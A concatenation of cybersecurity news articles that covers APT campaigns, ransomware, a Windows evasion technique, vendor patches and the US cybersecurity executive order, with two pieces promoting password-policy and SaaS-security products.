'text': 'Threat actors with suspected ties to Iran have been found to leverage instant messaging and VPN apps like Telegram and Psiphon to install a Windows remote access trojan (RAT) capable of stealing sensitive information from targets’ devices since at least 2015.\nRussian cybersecurity firm Kaspersky, which pieced together the activity, attributed the campaign to an advanced persistent threat (APT) group it tracks as Ferocious Kitten, a group that has singled out Persian-speaking individuals allegedly based in the country while successfully operating under the radar.\n“The targeting of Psiphon and Telegram, both of which are quite popular services in Iran, underlines the fact that the payloads were developed with the purpose of targeting Iranian users in mind,“ Kaspersky’s Global Research and Analysis Team (GReAT) said.\n\n“Moreover, the decoy content displayed by the malicious files often made use of political themes and involved images or videos of resistance bases or strikes against the Iranian regime, suggesting the attack is aimed at potential supporters of such movements within the country.“\nKaspersky’s findings emerge from two weaponized documents that were uploaded to VirusTotal in July 2020 and March 2021 that come embedded with macros, which, when enabled, drop next-stage payloads to deploy a new implant called MarkiRat.\nThe backdoor allows adversaries broad access to a victim’s personal data, comprising features to record keystrokes, capture clipboard content, download and upload files, as well as the ability to execute arbitrary commands on the victim machine.\n\nIn what appears to be an attempt to expand their arsenal, the attackers also experimented with different variants of MarkiRat that were found to intercept the execution of apps like Google Chrome and Telegram to launch the malware and keep it persistently anchored to the computer at the same time also making it much harder to be detected or removed. One of the discovered artifacts also includes a backdoored version of Psiphon; an open-source VPN tool often used to evade internet censorship.\nAnother recent variant involves a plain downloader that retrieves an executable from a hardcoded domain, with the researchers noting that the “use of this sample diverges from those used by the group in the past, where the payload was dropped by the malware itself, suggesting that the group might be in the process of changing some of its TTPs.“\n\nWhat’s more, the command-and-control infrastructure is also said to have hosted Android applications in the form of DEX and APK files, raising the possibility that the threat actor is also simultaneously developing malware aimed at mobile users.\nInterestingly, the tactics adopted by the adversary overlap with other groups that operate against similar targets, such as Domestic Kitten and Rampant Kitten, with Kaspersky finding parallels in the way the actor used the same set of C2 servers over extended periods of time and attempted to gather information from KeePass password manager.\n“Ferocious Kitten is an example of an actor that operates in a wider ecosystem intended to track individuals in Iran,“ the researchers concluded. “Such threat groups do not appear to be covered that often and can therefore get away with casually reusing infrastructure and toolsets without worrying about them being taken down or flagged by security solutions.“\n\n\nFound this article interesting?

{'title': 'Strengthen Your Password Policy With GDPR Compliance',
'text': 'A solid password policy is the first line of defense for your corporate network. Protecting your systems from unauthorized users may sound easy on the surface, but it can actually be quite complicated. You have to balance password security with usability, while also following various regulatory requirements.\nCompanies in the EU must have password policies that are compliant with the General Data Protection Regulation (GDPR). Even if your company isn’t based in the EU, these requirements apply if you have employees or customers residing in the EU or customers purchasing there.\nIn this post, we will look at GDPR requirements for passwords and provide practical tips on how to design your password policy. Remember, even if GDPR isn’t required for you now, the fundamentals of a data protection regulation plan can help strengthen your organization’s security. \nPassword requirements for GDPR compliance\nYou may be surprised to discover that the GDPR laws do not actually mention password policies at all. If you simply read the text, you may initially believe that a company can implement any password policy, without having any concerns over GDPR compliance.\nHowever, the GDPR laws will impact password policy under the umbrella of prevention. \nPreventing unauthorized access to information\nAny information that a company gathers from customers or other sources needs to be properly protected under GDPR compliance. This means having strong security measures to prevent hackers, and other unauthorized individuals, from gaining access to this data.\nAs we all know, one of the most important digital security steps in protecting any data is passwords.\nTips for creating a GDPR compliant password policy\nThe following are some best practices to consider when creating a strong password policy that will keep your systems safe, and get you closer to compliance. \nUse a password list to block compromised passwords\nA good password needs to be difficult to hack, or guess. Today, stolen and brute-forced credentials are the leading cause of data breaches. To protect your data against these attacks, a password policy should ban common and breached passwords.\nThanks to password reuse, many credential-based attacks use breached password lists from one system, to target another. Government agencies such as NIST, and the NCSC recommend blocking compromised and easily guessable passwords from being used altogether. This is one of the only ways to protect accounts, even if stronger password settings are enforced. \nDon’t use secret questions\nIt is a common practice to set up ’secret questions’ that can be answered in order to unlock or reset the password on an account.\nSecret questions would be things like ’what is your mother’s maiden name,’ or ’what was your school mascot.’ Since these types of questions can be vulnerable to social engineering attacks, it is best to avoid them completely. \nConsider MFA\nOne of the best ways you can improve your password security is to implement multi-factor authentication. This is where, in addition to a username and password, other factors are used to verify a user.\nFor example, this can be a one-time password that is generated specifically for the user on their mobile device during authentication. \nMaking GDPR compliance simple\nImplementing GDPR for your non-EU business may seem like a headache, but the compliance and additional security protections will cover your bases from a legal and cyberattack prevention standpoint. This article sums up the how, why, and when of GDPR compliance if you’re looking for additional intel.\nWhen you’re implementing a password policy for your AD with GDPR compliance in mind it’s a good idea to use a 3-rd party tool to help your password policy reach your entire end-user directory.\nMy favorite is Specops Password Policy which can help you block breached and other compromised passwords from Active Directory. During a password change in Active Directory, this service will block and notify users if the password they have chosen is found in a list of leaked passwords and provides dynamic feedback for password compliance. Specops Password Policy makes it easy to keep out vulnerable passwords and comply with the latest password guidelines.\nSpecops Password Policy keeps your policies organized and easily configurable\nUsing a password policy tool not only helps with GDPR compliance in preventing unauthorized access to information, it keeps your internal AD infrastructures organized and safe. Specops Password Policy extends the functionality of Group Policy and simplifies the management of fine-grained password policies for a simpler approach to password security and compliance. \nWhether you’re using a password policy tool or educating end-users manually GDPR compliance can be an asset to any security infrastructure regardless of location, and don’t forget it’s mandatory if you’re storing and EU citizen data. \n\n\nFound this article interesting?

{'title': 'Researchers Uncover ’Process Ghosting’ — A New Malware Evasion Technique',
'text': 'Cybersecurity researchers have disclosed a new executable image tampering attack dubbed “Process Ghosting“ that could be potentially abused by an attacker to circumvent protections and stealthily run malicious code on a Windows system.\n“With this technique, an attacker can write a piece of malware to disk in such a way that it’s difficult to scan or delete it — and where it then executes the deleted malware as though it were a regular file on disk,“ Elastic Security researcher Gabriel Landau said. “This technique does not involve code injection, Process Hollowing, or Transactional NTFS (TxF).“\n\nProcess Ghosting expands on previously documented endpoint bypass methods such as Process Doppelgänging and Process Herpaderping, thereby enabling the veiled execution of malicious code that may evade anti-malware defenses and detection.\nProcess Doppelgänging, analogous to Process Hollowing, involves injecting arbitrary code in the address space of a legitimate application’s live process that can then be executed from the trusted service. Process Herpaderping, first detailed last October, describes a method to obscure the behavior of a running process by modifying the executable on disk after the image has been mapped in memory.\nThe evasion works because of “a gap between when a process is created and when security products are notified of its creation,“ giving malware developers a window to tamper with the executable before security products can scan it.\n\nProcess Ghosting goes a step further from Doppelgänging and Herpaderping by making it possible to run executables that have already been deleted. It takes advantage of the fact that Windows’ attempts to prevent mapped executables from being modified or deleted only come into effect after the binary is mapped into an image section.\n“This means that it is possible to create a file, mark it for deletion, map it to an image section, close the file handle to complete the deletion, then create a process from the now-fileless section,“ Landau explained. “This is Process Ghosting.“\nIn a proof-of-concept (PoC) demo, the researchers detailed a scenario wherein Windows Defender attempts to open a malicious payload executable to scan it, but fails to do so because the file is in a delete-pending state, and then fails again as the file is already deleted, thus allowing it to be executed unimpeded.\nElastic Security said it reported the issue to Microsoft Security Response Center (MSRC) in May 2021, following which the Windows maker stated the issue “does not meet their bar for servicing,“ echoing a similar response when Process Herpaderping was responsibly disclosed to MSRC in July 2020.\n\nMicrosoft, for its part, has since released an updated version of its Sysinternals Suite earlier this January with an improved System Monitor (aka Sysmon) utility to help detect Process Herpaderping and Process Hollowing attacks.\nAs a result, Sysmon versions 13.00 (and later) can now generate and log “Event ID 25“ when a piece of malware tampers with a legitimate process and if a process image is changed from a different process, with Microsoft noting that the event is triggered “when the mapped image of a process doesn’t match the on-disk image file, or the image file is locked for exclusive access.“\n\n\nFound this article interesting?

'text': 'Ukrainian law enforcement officials on Wednesday announced the arrest of the Clop ransomware gang, adding it disrupted the infrastructure employed in attacks targeting victims worldwide since at least 2019.\nAs part of an international operation between the National Police of Ukraine and authorities from Interpol, Korea, and the U.S., six defendants have been accused of running a double extortion scheme wherein victims refusing to pay a ransom were threatened with the leak of sensitive financial, customer, or personal data stolen from them prior to encrypting the files.\n\nThe ransomware attacks amount to $500 million in monetary damages, the National Police said, noting that “law enforcement has managed to shut down the infrastructure from which the virus spreads and block channels for legalizing criminally acquired cryptocurrencies.“\nPolice officials are said to have conducted 21 searches in the Ukrainian capital of Kyiv, including the homes of the defendants, resulting in the seizure of computer equipment, luxury cars, and 5 million hryvnias ($184,679) in cash.\n\nThe alleged perpetrators face up to eight years in prison on charges of unauthorized interference in the work of computers, automated systems, computer networks or telecommunications networks. It’s, however, not clear if the arrested individuals are affiliates or core developers of the ransomware operation.\nAs of writing, the dark web portal that Clop uses to share stolen data — dubbed CL0P^-LEAKS — is still up and running, implying the complete infrastructure may not have been taken down.\nSince emerging on the scene in 2019, the Clop threat actor has been linked to a number of high-profile attacks as that of E-Land, Accellion, Qualys, Software AG IT, ExecuPharm, Indiabulls, as well as a number of universities like Maastricht University, Stanford University Medical School, University of Maryland, and University of California.\n\nThe development comes as another ransomware group by the name of Avaddon shuttered operations and handed over the decryption keys associated with 2,934 victims to Bleeping Computer last week, likely in response to heightened scrutiny by law enforcement and governments worldwide after a spate of attacks against critical infrastructure.\nThe Clop arrests add to a string of operations undertaken by government agencies in recent months to take down criminal activities in the cyberspace, including that of TrickBot, Emotet, ANoM, and Slilpp. Earlier this February, a joint probe involving French and Ukrainian authorities dismantled the cartel associated with Egregor ransomware.\n\n\nFound this article interesting?

{'title': 'Malware Attack on South Korean Entities Was Work of Andariel Group',
'text': 'A malware campaign targeting South Korean entities that came to light earlier this year has been attributed to a North Korean nation-state hacking group called Andariel, once again indicating that Lazarus attackers are following the trends and their arsenal is in constant development.\n“The way Windows commands and their options were used in this campaign is almost identical to previous Andariel activity,“ Russian cybersecurity firm Kaspersky said in a deep-dive published Tuesday. Victims of the attack are in the manufacturing, home network service, media, and construction sectors.\n\nDesignated as part of the Lazarus constellation, Andariel is known for unleashing attacks on South Korean organizations and businesses using specifically tailored methods created for maximum effectivity. In September 2019, the sub-group, along with Lazarus and Bluenoroff, was sanctioned by the U.S. Treasury Department for their malicious cyber activity on critical infrastructure.\nAndariel is believed to have been active since at least May 2016.\n\nNorth Korea has been behind an increasingly orchestrated effort aimed at infiltrating computers of financial institutions in South Korea and around the world as well as staging cryptocurrency heists to fund the cash-strapped country in an attempt to circumvent the stranglehold of economic sanctions imposed to stop the development of its nuclear weapons program.\nThe findings from Kaspersky build upon a previous report from Malwarebytes in April 2021, which documented a novel infection chain that distributed phishing emails weaponized with a macro embedded in a Word file that’s executed upon opening in order to deploy malicious code concealed in the form of a bitmap (.BMP) image file to drop a remote access trojan (RAT) on targeted systems.\nAccording to the latest analysis, the threat actor, besides installing a backdoor, is also said to have delivered file-encrypting ransomware to one of its victims, implying a financial motive to the attacks. It’s worth noting that Andariel has a track record of attempting to steal bank card information by hacking into ATMs to withdraw cash or sell customer information on the black market.\n\n“This ransomware sample is custom made and specifically developed by the threat actor behind this attack,“ Kaspersky Senior Security Researcher Seongsu Park said. “This ransomware is controlled by command line parameters and can either retrieve an encryption key from the C2 [server] or, alternatively, as an argument at launch time.“\nThe ransomware is designed to encrypt all files in the machine with the exception of system-critical “.exe,“ “.dll,“ “.sys,“ “.msiins,“ and “.drv“ extensions in return for paying a bitcoin ransom to gain access to a decrypt tool and unique key to unlock the scrambled files.\nKaspersky’s attribution to Andariel stems from overlaps in the XOR-based decryption routine that have been incorporated into the group’s tactics as early as 2018 and in the post-exploitation commands executed on victim machines.\n“The Andariel group has continued to focus on targets in South Korea, but their tools and techniques have evolved considerably,“ Park said. “The Andariel group intended to spread ransomware through this attack and, by doing so, they have underlined their place as a financially motivated state-sponsored actor.“\n\n\nFound this article interesting?

{'title': 'Ransomware Attackers Partnering With Cybercrime Groups to Hack High-Profile Targets',
'text': 'As ransomware attacks against critical infrastructure skyrocket, new research shows that threat actors behind such disruptions are increasingly shifting from using email messages as an intrusion route to purchasing access from cybercriminal enterprises that have already infiltrated major targets.\n“Ransomware operators often buy access from independent cybercriminal groups who infiltrate major targets and then sell access to the ransomware actors for a slice of the ill-gotten gains,“ researchers from Proofpoint said in a write-up shared with The Hacker News.\n“Cybercriminal threat groups already distributing banking malware or other trojans may also become part of a ransomware affiliate network.“\nBesides angling for a piece of the illegal profits, the email and cloud security firm said it is currently tracking at least 10 different threat actors who play the role of “initial access facilitators“ to supply affiliates and other cybercrime groups with an entry point to deploy data theft and encryption operations.\n\nInitial access brokers are known to infiltrate the networks via first-stage malware payloads such as The Trick, Dridex, Qbot, IcedID, BazaLoader, or Buer Loader, with most campaigns detected in the first half of 2021 leveraging banking trojans as ransomware loaders.\n\nThe brokers — which were identified by tracking the backdoor access advertised on hacking forums — include TA800, TA577, TA569, TA551 (Shathak), TA570, TA547, TA544 (Bamboo Spider), TA571, TA574, and TA575, with overlaps observed between various threat actors, malware, and ransomware deployments.\n\nFor example, both TA577 and TA551 have been found to use IcedID as an initial access payload to deliver Egregor, Maze, and REvil ransomware, while TA800 has employed BazaLoader to deploy Ryuk on targeted systems.\nIn a hypothetical attack chain, a threat actor could send an email with a malware-infected Office document, which, when opened, drops the first-stage payload to maintain persistent backdoor access. This access can then be sold to a second threat actor, who exploits it to deploy a Cobalt Strike beacon to pivot laterally across the broader network and deploy the ransomware.\n\nThat said, attacks that rely on email messages to directly distribute ransomware in the form of malicious attachments or embedded hyperlinks continue to remain a threat, albeit at lower volumes. Proofpoint noted that it identified 54 ransomware campaigns distributing a little over one million messages over the past year.\n“Short dwell times, high payouts, and collaboration across cybercriminal ecosystems have led to a perfect storm of cybercrime that the world’s governments are taking seriously,“ the researchers concluded. “It is possible with new disruptive efforts focused on the threat and growing investments in cyber defense across supply chains, ransomware attacks will decrease in frequency and efficacy.“\n\n\nFound this article interesting?

'text': 'The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday issued an advisory regarding a critical software supply-chain flaw impacting ThroughTek’s software development kit (SDK) that could be abused by an adversary to gain improper access to audio and video streams.\n“Successful exploitation of this vulnerability could permit unauthorized access to sensitive information, such as camera audio/video feeds,“ CISA said in the alert.\nThroughTek’s point-to-point (P2P) SDK is widely used by IoT devices with video surveillance or audio/video transmission capability such as IP cameras, baby and pet monitoring cameras, smart home appliances, and sensors to provide remote access to the media content over the internet.\n\nTracked as CVE-2021-32934 (CVSS score: 9.1), the shortcoming affects ThroughTek P2P products, versions 3.1.5 and before as well as SDK versions with nossl tag, and stems from a lack of sufficient protection when transferring data between the local device and ThroughTek’s servers.\nThe flaw was reported by Nozomi Networks in March 2021, which noted that the use of vulnerable security cameras could leave critical infrastructure operators at risk by exposing sensitive business, production, and employee information.\n\n“The [P2P] protocol used by ThroughTek lacks a secure key exchange [and] relies instead on an obfuscation scheme based on a fixed key,“ the San Francisco-headquartered IoT security firm said. “Since this traffic traverses the internet, an attacker that is able to access it can reconstruct the audio/video stream.“\nTo demonstrate the vulnerability, the researchers created a proof-of-concept (PoC) exploit that deobfuscates on-the-fly packets from the network traffic.\n\nThroughTek recommends original equipment manufacturers (OEMs) using SDK 3.1.10 and above to enable AuthKey and DTLS, and those relying on an SDK version prior to 3.1.10 to upgrade the library to version 3.3.1.0 or v3.4.2.0 and enable AuthKey/DTLS.\nSince the flaw affects a software component that’s part of the supply chain for many OEMs of consumer-grade security cameras and IoT devices, the fallout from such an exploitation could effectively breach the security of the devices, enabling the attacker to access and view confidential audio or video streams.\n“Because ThroughTek’s P2P library has been integrated by multiple vendors into many different devices over the years, it’s virtually impossible for a third-party to track the affected products,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'Experts Shed Light On Distinctive Tactics Used by Hades Ransomware',
'text': 'Cybersecurity researchers on Tuesday disclosed “distinctive“ tactics, techniques, and procedures (TTPs) adopted by operators of Hades ransomware that set it apart from the rest of the pack, attributing it to a financially motivated threat group called GOLD WINTER.\n“In many ways, the GOLD WINTER threat group is a typical post-intrusion ransomware threat group that pursues high-value targets to maximize how much money it can extort from its victims,“ researchers from SecureWorks Counter Threat Unit (CTU) said in an analysis shared with The Hacker News. “However, GOLD WINTER’s operations have quirks that distinguish it from other groups.“\nThe findings come from a study of incident response efforts the Atlanta-based cybersecurity firm engaged in the first quarter of 2021.\n\nSince first emerging in the threat landscape in December 2020, Hades has been classified as INDRIK SPIDER’s successor to WastedLocker ransomware with “additional code obfuscation and minor feature changes,“ per Crowdstrike. INDRIK SPIDER, also known as GOLD DRAKE and Evil Corp, is a sophisticated eCrime group infamous for operating a banking trojan called Dridex as well as distributing BitPaymer ransomware between 2017 and 2020.\nThe WastedLocker-derived ransomware strain has been found to have impacted at least three victims as of late March 2021, according to research by Accenture’s Cyber Investigation and Forensic Response (CIFR) and Cyber Threat Intelligence (ACTI) teams, including a U.S. transportation and logistics organization, a U.S. consumer products organization, and a global manufacturing organization. Trucking giant Forward Air was revealed to be a target back in December 2020. \nThen a subsequent analysis published by Awake Security raised the possibility that an advanced threat actor may be operating under the guise of Hades, citing a Hafnium domain that was identified as an indicator of compromise within the timeline of the Hades attack. Hafnium is the name assigned by Microsoft to a Chinese nation-state actor that the company has said is behind the ProxyLogon attacks on vulnerable Exchange Servers earlier this year.\n\nStating that the threat group uses TTPs not associated with other ransomware operators, Secureworks said the absence of Hades from underground forums and marketplaces could mean that Hades is operated as private ransomware rather than ransomware-as-a-service (RaaS).\nGOLD WINTER targets virtual private networks and remote desktop protocols to gain an initial foothold and maintain access to victim environments, using it to achieve persistence via tools such as Cobalt Strike. In one instance, the adversary disguised the Cobalt Strike executable as a CorelDRAW graphics editor application to mask the true nature of the file, the researchers said.\n\nIn a second case, Hades was found to leverage SocGholish malware — usually associated with the GOLD DRAKE group — as an initial access vector. SocGholish refers to a drive-by attack in which a user is tricked into visiting an infected website using social engineering themes that impersonate browser updates to trigger a malicious download without user intervention.\n\nInterestingly, in what appears to be an attempt to mislead attribution or “pay homage to admired ransomware families,“ Hades has exhibited a pattern of duplicating ransom notes from other rival groups like REvil and Conti.\nAnother novel technique involves the use of Tox instant messaging service for communications, not to mention the use of Tor-based websites tailored to each victim as opposed to utilizing a centralized leak site to expose data stolen from its victims. “Each website includes a victim-specific Tox chat ID for communications,“ the researchers said.\n“Ransomware groups are typically opportunistic: they target any organization that could be susceptible to extortion and will likely pay the ransom,“ the researchers noted. “However, GOLD WINTER’s attacks on large North America-based manufacturers indicates that the group is a ’big game hunter’ that specifically seeks high-value targets.“\n\n\nFound this article interesting?

'text': 'Apple on Monday shipped out-of-band security patches to address two zero-day vulnerabilities in iOS 12.5.3 that it says are being actively exploited in the wild.\n\nThe latest update, iOS 12.5.4, comes with fixes for three security bugs, including a memory corruption issue in ASN.1 decoder (CVE-2021-30737) and two flaws concerning its WebKit browser engine that could be abused to achieve remote code execution —\n\nCVE-2021-30761 - A memory corruption issue that could be exploited to gain arbitrary code execution when processing maliciously crafted web content. The flaw was addressed with improved state management.CVE-2021-30762 - A use-after-free issue that could be exploited to gain arbitrary code execution when processing maliciously crafted web content. The flaw was resolved with improved memory management.\nBoth CVE-2021-30761 and CVE-2021-30762 were reported to Apple anonymously, with the Cupertino-based company stating in its advisory that it’s aware of reports that the vulnerabilities “may have been actively exploited.“ As is usually the case, Apple didn’t share any specifics on the nature of the attacks, the victims that may have been targeted, or the threat actors that may be abusing them.\nOne thing evident, however, is that the active exploitation attempts were directed against owners of older devices such as iPhone 5s, iPhone 6, iPhone 6 Plus, iPad Air, iPad mini 2, iPad mini 3, and iPod touch (6th generation). The move mirrors a similar fix that Apple rolled out on May 3 to remediate a buffer overflow vulnerability (CVE-2021-30666) in WebKit targeting the same set of devices.\n\nAlong with the two aforementioned flaws, Apple has patched a total of 12 zero-days affecting iOS, iPadOS, macOS, tvOS, and watchOS since the start of the year —\nCVE-2021-1782 (Kernel) - A malicious application may be able to elevate privilegesCVE-2021-1870 (WebKit) - A remote attacker may be able to cause arbitrary code executionCVE-2021-1871 (WebKit) - A remote attacker may be able to cause arbitrary code executionCVE-2021-1879 (WebKit) - Processing maliciously crafted web content may lead to universal cross-site scriptingCVE-2021-30657 (System Preferences) - A malicious application may bypass Gatekeeper checksCVE-2021-30661 (WebKit Storage) - Processing maliciously crafted web content may lead to arbitrary code executionCVE-2021-30663 (WebKit) - Processing maliciously crafted web content may lead to arbitrary code executionCVE-2021-30665 (WebKit) - Processing maliciously crafted web content may lead to arbitrary code executionCVE-2021-30666 (WebKit) - Processing maliciously crafted web content may lead to arbitrary code executionCVE-2021-30713 (TCC framework) - A malicious application may be able to bypass Privacy preferences\nUsers of Apple devices are recommended to update to the latest versions to mitigate the risk associated with the vulnerabilities.\n\n\nFound this article interesting?

'text': 'Google on Monday announced that it’s rolling out client-side encryption to Google Workspace (formerly G Suite), thereby giving its enterprise customers direct control of encryption keys and the identity service they choose to access those keys.\n“With client-side encryption, customer data is indecipherable to Google, while users can continue to take advantage of Google’s native web-based collaboration, access content on mobile devices, and share encrypted files externally,“ the search giant said. \n“When combined with our other encryption capabilities, customers can add new levels of data protection for their Google Workspace data.“\n\nThe development coincides with the Google Workspace and Google Chat’s broader availability to all users with a Google account. Workspace is the company’s enterprise offering consisting of Gmail, Chat, Calendar, Drive, Docs, Sheets, Slides, Meet, and other tools.\n\nBusinesses using Google Workspace have the choice of storing their encryption keys with one of four partners — Flowcrypt, Futurex, Thales, or Virtru — which the company said offer both key management and access control capabilities that are compatible with Google’s specifications. \nThe access service then holds the key responsible for deciphering encrypted Google Workspace files, putting them out of reach of Google unless it comes in possession of the key.\nThe move is aimed at organizations that deal with sensitive or regulated data, like intellectual property, healthcare records, or financial information, thus enabling them to meet stringent privacy and compliance requirements.\nWhat’s more, Google intends to publish the key access service API specifications that can be used in conjunction with client-side encryption later this year in a bid to allow enterprises to build their own in-house key solutions and give them full control over the encryption keys.\n\nAlong with client-side encryption, the company is also setting new “trust rules“ when it comes to how files can be shared, both within and outside of their organization, letting administrators “enforce restrictions that limit internal and external sharing.“\n\nAdditionally, Google is turning on phishing and malware content protection for Google Drive to block malicious files from being shared within organizations.\n“If abusive content is found, the relevant file is flagged and made visible only to admins and the file’s owner,“ Google said. “This prevents sharing and reduces the number of users potentially impacted by the abusive content.“\n\n\nFound this article interesting?

{'title': 'NoxPlayer Supply-Chain Attack is Likely the Work of Gelsemium Hackers',
'text': 'A new cyber espionage group named Gelsemium has been linked to a supply chain attack targeting the NoxPlayer Android emulator that was disclosed earlier this year.\nThe findings come from a systematic analysis of multiple campaigns undertaken by the APT crew, with evidence of the earliest attack dating back all the way to 2014 under the codename Operation TooHash based on malware payloads deployed in those intrusions.\n“Victims of these campaigns are located in East Asia as well as the Middle East and include governments, religious organizations, electronics manufacturers and universities,“ cybersecurity firm ESET said in an analysis published last week.\n\n“Gelsemium’s whole chain might appear simple at first sight, but the exhaustive configurations, implanted at each stage, modify on-the-fly settings for the final payload, making it harder to understand.“\nTargeted countries include China, Mongolia, North and South Korea, Japan, Turkey, Iran, Iraq, Saudi Arabia, Syria, and Egypt.\nSince its origins in the mid-2010s, Gelsemium has been found employing a variety of malware delivery techniques ranging from spear-phishing documents exploiting Microsoft Office vulnerabilities (CVE-2012-0158) and watering holes to a remote code execution flaw in Microsoft Exchange Server — likely CVE-2020-0688, which was addressed by the Windows maker in June 2020 — to deploy the China Chopper web shell.\n\nAccording to ESET, Gelsemium’s first stage is a C++ dropper named “Gelsemine,“ which deploys a loader “Gelsenicine“ onto the target system, which, in turn, retrieves and executes the main malware “Gelsevirine“ that’s capable of loading additional plug-ins provided by the command-and-control (C2) server.\nThe adversary is said to have been behind a supply chain attack aimed at BigNox’s NoxPlayer, in a campaign dubbed “Operation NightScout,“ in which the software’s update mechanism was compromised to install backdoors such as Gh0st RAT and PoisonIvy RAT to spy on its victims, capture keystrokes, and gather valuable information.\n\n“Victims originally compromised by that supply chain attack were later being compromised by Gelsemine,“ ESET researchers Thomas Dupuy and Matthieu Faou noted, with similarities observed between the trojanized versions of NoxPlayer and Gelsemium malware.\nWhat’s more, another backdoor called Chrommme, which was detected on an unnamed organization’s machine also compromised by the Gelsemium group, used the same C2 server as that of Gelsevirine, raising the possibility that the threat actor may be sharing the attack infrastructure across its malware toolset.\n“The Gelsemium biome is very interesting: it shows few victims (according to our telemetry) with a vast number of adaptable components,“ the researchers concluded. “The plug-in system shows that developers have deep C++ knowledge.“\n\n\nFound this article interesting?

{'title': 'Cybersecurity Executive Order 2021: What It Means for Cloud and SaaS Security',
'text': 'In response to malicious actors targeting US federal IT systems and their supply chain, the President released the “Executive Order on Improving the Nation’s Cybersecurity (Executive Order).“\nAlthough directed at Federal departments and agencies, the Executive Order will likely have a ripple effect through the Federal technology supply stream. Private companies and enterprises will look to the Executive Order to build their best practices.\nAt a high level, the Executive Order includes information-sharing requirements, a push toward cloud and Zero Trust architectures, and enhancing transparency throughout the software supply chain.\nUnderstanding the fundamentals of the White House Executive Order on Improving the Nation’s Cybersecurity\nThe bulk of the Executive Order focuses on administrative tasks associated with it, including redefining contract language, setting timelines, and defining agency roles and responsibilities. For enterprises that don’t supply technology to the federal government, the Executive Order may feel unimportant. \nIn reality, several of the basic tenets could be used by companies operating outside the federal IT supply chain, including:\nBetter intelligence sharingModernizing agency infrastructure with cloud and Zero TrustSecuring the federal IT software supply chain \nWhat the Executive Order Says\nThe text of the Executive Order is long and comes with all the regulatory jargon associated with the law. Breaking it down into bite-size chunks gives a good overview, though. \nBetter information sharing\nThe short, succinct point of this one is that “everyone needs to play nicely and stop hiding behind contracts.“ In a nutshell, the Executive Order looks to create a more meaningful information-sharing opportunity for agencies and vendors when threat actors find and exploit a vulnerability. \nMove to cloud and create Zero Trust Architecture\nAlthough this one mostly speaks for itself, the requirements in the Executive Order created a bit of panic across the federal space because a lot of the timelines are super short. For example, within 60 days, federal agencies need to:\nPrioritize resources to move to the cloud as rapidly as possiblePlan to implement Zero Trust Architecture (ZTA)Get things as secure as possible and remediate cyber risk\nFinally, within 180 days, they all need to adopt multi-factor authentication (MFA) and encryption both at-rest and in-transit. With agencies adopting Software-as-a-Service (SaaS) applications to modernize their IT stacks, identity, and access control configurations, including multi-factor authentication, act as a primary risk mitigation strategy. \nSecure the supply chain\nWithout even needing to list the recent supply chain hacks and breaches, this is the least surprising of all the requirements. Surprising very few people, this section includes several key bullet points:\nCreate criteria for software security evaluationEstablish standard and procedures for secure software development Establish a “Software Bill of Materials“ that lists all the technology “ingredients“ developers use\nWhat the Executive Order Means for Enterprises\nFor agencies, this is going to take a bit of work. For enterprises, this is likely a harbinger of things to come. The problem is that while the Executive Order is a great start, the two primary requirements for putting Zero Trust into effect, MFA and encryption, don’t really close all cloud security gaps. \nAccording to the 2021 Data Breach Investigations Report (DBIR) misconfigurations remain a primary threat vector for cloud architectures. The increased use of Software-as-a-Service (SaaS) applications actually trigger two different attack patterns:\nBasic Web Application Attacks: focused on direct objectives, ranging from access to email and web application data to repurposing the web application to distribute malware, defacement, or Distributed Denial of Service (DDoS) attacks.Miscellaneous Errors: unintentional actions, usually by an internal actor or partner actors, including sending data to the wrong recipients. \nAccording to the DBIR, the basic web application attacks include things like credential theft and brute force attacks. Meanwhile, the Miscellaneous Errors subset also included things like cloud-based file storage being placed onto the internet with no controls.\nThese attack vectors show the importance of SaaS security management to cloud security as a whole. Many enterprises lack visibility into their configurations, and the proliferation of SaaS applications makes manual configuration monitoring nearly impossible. As enterprises continue on their digital transformation journey, configuration monitoring and management will only become more difficult.\nCloud security, even with a focus on establishing a Zero Trust Architecture, needs to incorporate SaaS application security. As agencies and enterprises in their supply chain incorporate SaaS apps, the security risk that misconfigurations pose needs to be addressed.\nThe Enhance SaaS Security Playlist\nAs agencies and enterprises start looking for solutions, enhancing SaaS security should be on the “proactive steps to take“ list.\nIntegrate all applications: Travel the Long and Winding Road\nDoing the business of your business requires many applications, especially across remote workforces. Despite a potentially long purchase cycle, adding applications to your stack is relatively easy. Your IT team creates some connections to your cloud infrastructure using APIs, then adds the users. People can get down to business. \nLearn more about how to prevent misconfiguration risks in your SaaS app estate\nManaging SaaS app security for the long term is the big challenge. You have a lot of applications, and each one has unique configurations and language. No organization can have an expert in every application language and configuration. If you can integrate all your applications into a single platform that creates a standardized approach to configurations, you’re taking the first step down the long and winding road to securing your cloud infrastructure.\nVerify access and enforce policies: Stop Believin’\nWhile Journey might say “don’t stop believin,’“ a Zero Trust Architecture means not believing anyone or anything until they provide the right proof. For example, MFA doesn’t work on a system that uses legacy authentication protocols like IMAP and POP3. If you need to secure your SaaS stack and meet these short timelines, you need visibility into all user access, especially Privileged Access holders like super admins or service accounts. \nEnterprises need unified policies across all SaaS applications, ensuring continuous compliance. This means the ability to analyze every user’s access across all your SaaS platforms by role, privilege, risk level, and platform with the ability to mix and match as you search, so you have the insights you need, when you need them. \nEliminate SaaS misconfigurations\nMonitor SaaS security continuously: You Oughta Know\nThe hardest part of SaaS security is that it continuously changes, like employees sharing documents with third parties or adding new non-company users to collaboration platforms. The problem is that the Executive Order and most other compliance mandates assume that you oughta know about your risk posture because you’re continuously monitoring your security. \nYou need always-on SaaS security that provides real-time risk identification, context-based alerts, and risk prioritization. \nAutomate remediation activities: Never Gonna Let You Down\nNo single human being can manage SaaS security manually. \nManually managing the risks arising from so many users, so many applications, and so many locations will leave the IT department running on espresso and energy drinks and, unfortunately, most likely, missing a critical risk. \nAutomating the SaaS security process in a single cloud-based platform is the most efficient way to manage the process. SaaS platform management solutions meet your security where it lives, in the cloud, so you can automate your security at cloud-speed, reduce risk, and strengthen your security and compliance posture. \nAdaptive Shield: SaaS Performance Security Management is the Missing Link\nAdaptive Shield provides full visibility into one of the most complex issues in cloud security. This SaaS security posture management solution enables enterprises to monitor for misconfiguration risks across the SaaS estate continuously: from configurations that cover malware, spam, and phishing to suspicious behavior and incorrectly configured user permissions. \nAdaptive Shield aligns technical controls with CIS Benchmarks and can map controls’ compliance to NIST 800-53 as well as other frameworks. \nThe Adaptive Shield SaaS security platform management solution also natively connects with Single-Sign-On (SSO) solutions, like Azure, Ping, and Okta, to help track MFA use across the organization. \nWith SaaS applications becoming the 